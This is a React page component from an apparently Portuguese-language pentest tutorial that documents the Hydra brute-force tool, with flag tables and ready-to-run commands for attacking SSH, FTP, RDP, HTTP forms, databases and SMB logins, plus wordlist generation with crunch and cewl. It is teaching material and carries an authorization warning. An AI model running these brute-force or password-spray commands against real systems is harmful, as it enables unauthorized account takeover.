import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { ParamsTable } from "@/components/ui/ParamsTable";

export default function Hydra() {
  return (
    <PageContainer
      title="Hydra"
      subtitle="Ferramenta de brute force para serviços de autenticação em rede."
      difficulty="intermediario"
      timeToRead="12 min"
    >
      <AlertBox type="danger" title="Autorização obrigatória">
        Ataques de brute force sem autorização são ilegais. Use apenas em sistemas onde você tem permissão explícita.
      </AlertBox>

      <h2>Consultando a ajuda do Hydra</h2>
      <CodeBlock language="bash" code={`# Ajuda completa do Hydra
hydra --help
hydra -h

# O --help do Hydra mostra (traduzido):
# Uso: hydra [[-l LOGIN|-L ARQUIVO] [-p SENHA|-P ARQUIVO|-x MIN:MAX:CHARSET|-e nsr]]
#           [-u] [-f] [-M ARQUIVO] [-t TASKS] [-T TASKS] [-w WAIT] [-W WAIT]
#           [-o ARQUIVO] [-b FORMATO] [-C ARQUIVO] [-n PORT] [-s PORT]
#           [-S] [-O] [-q] [-4|-6] [-v|-V|-d] [-U]
#           [servidor serviço [OPT]]
# 
# Principais opções explicadas abaixo:`} />

      <AlertBox type="info" title="Como ler o --help do Hydra">
        O help do Hydra usa uma notação especial: <code>-l</code> (l minúsculo) é para um único login, 
        <code>-L</code> (L maiúsculo) é para uma lista de logins em arquivo. 
        O mesmo vale para <code>-p</code> (senha única) e <code>-P</code> (lista de senhas).
      </AlertBox>

      <h2>Sintaxe básica</h2>
      <CodeBlock language="bash" code={`# Sintaxe geral:
# hydra [opções de credencial] [opções de comportamento] ALVO PROTOCOLO [opções do protocolo]

# SSH — usuário único, lista de senhas
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh

# SSH — lista de usuários E lista de senhas (todas combinações)
hydra -L users.txt -P passwords.txt 192.168.1.1 ssh

# FTP — usuário único, senha única (teste rápido)
hydra -l ftp -p ftp 192.168.1.1 ftp

# RDP (Windows Remote Desktop)
hydra -l administrator -P wordlist.txt 192.168.1.1 rdp`} />

      <ParamsTable
        title="Flags de credenciais — as mais importantes"
        params={[
          { flag: "-l LOGIN", desc: "Um único nome de usuário para testar. (l minúsculo)", exemplo: "hydra -l admin -P rockyou.txt alvo ssh" },
          { flag: "-L ARQUIVO", desc: "Arquivo com lista de usuários (um por linha). (L maiúsculo)", exemplo: "hydra -L usuarios.txt -P rockyou.txt alvo ssh" },
          { flag: "-p SENHA", desc: "Uma única senha para testar. (p minúsculo) Combinado com -L para password spray.", exemplo: "hydra -L users.txt -p 'Senha@123' alvo ssh" },
          { flag: "-P ARQUIVO", desc: "Arquivo com lista de senhas (um por linha). (P maiúsculo)", exemplo: "hydra -l admin -P /usr/share/wordlists/rockyou.txt alvo ssh" },
          { flag: "-C ARQUIVO", desc: "Arquivo com pares usuário:senha (colon-separated). Ex: 'admin:senha123'.", exemplo: "hydra -C credenciais.txt alvo ftp" },
          { flag: "-e nsr", desc: "Tenta variações extras: n=senha vazia, s=login como senha, r=senha invertida. Muito útil!", exemplo: "hydra -l admin -P lista.txt -e nsr alvo ssh" },
          { flag: "-x MIN:MAX:CHARS", desc: "Gera senhas on-the-fly por força bruta com tamanho MIN a MAX usando os CHARS. Ex: -x 4:6:aA1", exemplo: "hydra -l admin -x 4:6:a1 alvo ftp" },
        ]}
      />

      <ParamsTable
        title="Flags de comportamento — controle do ataque"
        params={[
          { flag: "-t TAREFAS", desc: "Número de conexões paralelas por host. Padrão é 16. Aumente com cuidado — pode bloquear o serviço.", exemplo: "-t 32" },
          { flag: "-T TAREFAS", desc: "Total de tarefas paralelas globais (quando atacando múltiplos hosts).", exemplo: "-T 4" },
          { flag: "-w ESPERA", desc: "Tempo de espera (em segundos) por uma resposta do servidor. Padrão é 32.", exemplo: "-w 10" },
          { flag: "-W ESPERA", desc: "Tempo de espera entre cada tentativa de conexão. Reduz velocidade para evitar bloqueio.", exemplo: "-W 2" },
          { flag: "-f", desc: "Para o ataque assim que encontrar o primeiro login válido para o host.", exemplo: "-f" },
          { flag: "-F", desc: "Para o ataque assim que encontrar o primeiro login válido em qualquer host (modo multi-host).", exemplo: "-F" },
          { flag: "-s PORTA", desc: "Especifica uma porta não padrão para o serviço.", exemplo: "-s 2222 (SSH em porta alternativa)" },
          { flag: "-S", desc: "Força conexão SSL/TLS para serviços que suportam.", exemplo: "hydra -l admin -P lista.txt -S alvo https-form-post" },
          { flag: "-u", desc: "Faz loop por usuários primeiro (padrão é por senhas). Útil para password spray.", exemplo: "-u" },
          { flag: "-o ARQUIVO", desc: "Salva os logins encontrados em um arquivo.", exemplo: "-o logins_encontrados.txt" },
          { flag: "-v", desc: "Modo verboso — exibe cada tentativa.", exemplo: "-v" },
          { flag: "-V", desc: "Modo muito verboso — mostra usuário+senha sendo testados em tempo real.", exemplo: "-V" },
          { flag: "-q", desc: "Modo quieto — não exibe mensagens de erro (apenas os logins encontrados).", exemplo: "-q" },
          { flag: "-R", desc: "Retoma uma sessão de ataque anterior que foi interrompida.", exemplo: "hydra -R" },
          { flag: "-4 / -6", desc: "Força o uso de IPv4 ou IPv6.", exemplo: "-6 (para atacar endereços IPv6)" },
        ]}
      />

      <h2>Serviços web (HTTP)</h2>
      <CodeBlock language="bash" code={`# HTTP POST form — a mais usada em pentest web
hydra -l admin -P /usr/share/wordlists/rockyou.txt alvo.com \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Credenciais inválidas"

# Explicação do parâmetro http-post-form:
# "/CAMINHO : DADOS_POST : F=STRING_DE_FALHA"
# ^USER^ → onde o Hydra insere o nome de usuário
# ^PASS^ → onde o Hydra insere a senha
# F= → string que aparece quando o login FALHA (ajuste para o seu alvo)
# S= → string que aparece quando o login SUCEDE (alternativo ao F=)

# HTTPS POST
hydra -l admin -P wordlist.txt -s 443 alvo.com \
  https-post-form "/login:user=^USER^&pass=^PASS^:F=failed"

# HTTP Basic Auth (autenticação de browser)
hydra -l admin -P wordlist.txt http-get://alvo.com/admin/`} />

      <AlertBox type="warning" title="Dica: Como descobrir o F= correto">
        Ao testar um login com credencial errada no Burp Suite ou browser, veja qual mensagem aparece na resposta. 
        Use exatamente essa string no parâmetro <code>F=</code>. Ex: <code>F=Login inválido</code>, <code>F=Invalid credentials</code>, <code>F=Senha incorreta</code>.
      </AlertBox>

      <h2>Bancos de dados e outros serviços</h2>
      <CodeBlock language="bash" code={`# MySQL
hydra -l root -P wordlist.txt 192.168.1.1 mysql

# PostgreSQL
hydra -l postgres -P wordlist.txt 192.168.1.1 postgres

# SMB (Windows shares — compartilhamentos)
hydra -l administrator -P wordlist.txt 192.168.1.1 smb

# Telnet
hydra -l admin -P wordlist.txt 192.168.1.1 telnet

# SMTP (autenticação de email)
hydra -l usuario@empresa.com -P wordlist.txt 192.168.1.1 smtp

# VNC
hydra -P wordlist.txt 192.168.1.1 vnc`} />

      <ParamsTable
        title="Protocolos suportados — os mais usados em pentest"
        params={[
          { flag: "ssh", desc: "Secure Shell — serviço de acesso remoto Linux/Unix. Porta padrão 22." },
          { flag: "ftp", desc: "File Transfer Protocol — transferência de arquivos. Porta padrão 21." },
          { flag: "rdp", desc: "Remote Desktop Protocol — acesso remoto gráfico Windows. Porta padrão 3389." },
          { flag: "smb", desc: "Server Message Block — compartilhamento de arquivos Windows. Porta padrão 445." },
          { flag: "mysql", desc: "Banco de dados MySQL/MariaDB. Porta padrão 3306." },
          { flag: "postgres", desc: "Banco de dados PostgreSQL. Porta padrão 5432." },
          { flag: "mssql", desc: "Microsoft SQL Server. Porta padrão 1433." },
          { flag: "telnet", desc: "Protocolo antigo de acesso remoto sem criptografia. Porta padrão 23." },
          { flag: "http-post-form", desc: "Formulário de login HTTP POST. Você define o caminho, campos e string de falha." },
          { flag: "https-post-form", desc: "Mesmo que acima mas via HTTPS." },
          { flag: "http-get", desc: "Autenticação HTTP Basic via GET (popup de browser)." },
          { flag: "smtp", desc: "Autenticação de servidor de email SMTP. Porta 25 ou 587." },
          { flag: "imap", desc: "Protocolo de email IMAP. Porta 143 ou 993." },
          { flag: "vnc", desc: "Virtual Network Computing — acesso gráfico remoto. Porta padrão 5900." },
          { flag: "snmp", desc: "Simple Network Management Protocol — gerenciamento de rede. Porta UDP 161." },
        ]}
      />

      <h2>Gerando wordlists customizadas</h2>
      <CodeBlock language="bash" code={`# crunch — gerar wordlists do zero
sudo apt install -y crunch

# Sintaxe: crunch MÍNIMO MÁXIMO [CHARSET] [opções]
crunch 4 6 0123456789              # PINs de 4 a 6 dígitos
crunch 8 8 abcdefghijklmnopqrstuvwxyz  # 8 letras minúsculas
crunch 6 8 abc123!@#               # charset customizado

# cewl — gerar wordlist baseada no site alvo
cewl http://alvo.com -m 5 -d 2 -w wordlist_site.txt
# -m 5 → mínimo 5 caracteres por palavra
# -d 2 → profundidade de crawl (páginas seguidas por link)
# -w → arquivo de saída

# Instalar cewl se necessário
sudo apt install -y cewl`} />
    </PageContainer>
  );
}
